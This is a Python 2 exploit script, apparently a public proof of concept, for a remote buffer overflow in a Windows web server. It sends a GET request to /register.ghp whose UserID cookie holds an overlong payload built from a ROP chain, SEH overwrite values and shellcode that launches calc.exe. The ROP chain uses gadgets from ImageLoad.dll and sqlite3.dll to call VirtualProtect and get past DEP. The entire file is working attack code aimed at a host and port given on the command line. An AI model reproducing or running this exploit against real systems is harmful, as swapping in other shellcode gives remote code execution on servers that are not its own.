import socket
import struct
import sys

host = str(sys.argv[1])
port = int(sys.argv[2])

ip = sys.argv[1]
socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect((ip,port))

# spawns calc.exe on win 7 x64
shellcode = ("\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
"\x57\x78\x01\xc2\x8b\x7a\x20\x01"
"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
"\x45\x81\x3e\x43\x72\x65\x61\x75"
"\xf2\x81\x7e\x08\x6f\x63\x65\x73"
"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
"\xb1\xff\x53\xe2\xfd\x68\x63\x61"
"\x6c\x63\x89\xe2\x52\x52\x53\x53"
"\x53\x53\x53\x53\x52\x53\xff\xd7")

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x10014c05,  # POP EBP # RETN [ImageLoad.dll]
      0x10014c05,  # skip 4 bytes [ImageLoad.dll]
      #0x00000000,  # [-] Unable to find gadget to put 00000201 into ebx
      0x10015442,  # POP EAX # RETN    ** [ImageLoad.dll] **
      0x909090FF,  # FF will be number of bytes allocated for shellcode
      0x10020191,  # ADD BL,AL # MOV EAX,804 # RETN    ** [ImageLoad.dll] **
      0x10022c4c,  # XOR EDX,EDX # RETN [ImageLoad.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]
      0x1001b482,  # POP ECX # RETN [ImageLoad.dll]
      0x61c737d4,  # &Writable location [sqlite3.dll]
      0x1002324d,  # POP EDI # RETN [ImageLoad.dll]
      0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
      0x1001972a,  # POP ESI # RETN [ImageLoad.dll]
      0x10021e9d,  # JMP [EAX] [ImageLoad.dll]
      0x10015442,  # POP EAX # RETN [ImageLoad.dll]
      0x61c832d0,  # ptr to &VirtualProtect() [IAT sqlite3.dll]
      0x100240c2,  # PUSHAD # RETN [ImageLoad.dll]
      0x61c24169,  # ptr to 'push esp # ret ' [sqlite3.dll]
    ]
    return ''.join(struct.pack('<L', _) for _ in rop_gadgets)


rop_chain = create_rop_chain()
nseh = "\xeb\x06\x90\x90"
seh = struct.pack('<L', 0x10022877) # ADD ESP,1004 # RETN    ** [ImageLoad.dll] **# esp 0x57561FC

payload = "A" * 2463
payload += rop_chain
payload += shellcode
payload += "C" * (1596 - len(rop_chain) - len(shellcode))
payload += nseh
payload += seh
payload += "\x90" * 500


traffic = ("GET /register.ghp HTTP/1.1\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Host: " + host + ":" + str(port) + "\r\n"
"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\r\n"
"Accept-Language: en-US,en;q=0.5\r\n"
"Accept-Encoding: gzip, deflate\r\n"
"Referer: http://" + host + ":" + str(port) + "/login.htm\r\n"
"Connection: keep-alive\r\n"
"If-Modified-Since: Fri, 01 Apr 2022 20:05:37 GMT\r\n"
"Cookie: SESSIONID=31094; UserID=" + payload + "; PassWD=; frmUserName=; frmUserPass=; rememberPass=202%2C197%2C208%2C215%2C201\r\n\r\n")


print traffic
socket.send(traffic)
socket.close()
print "Thx"
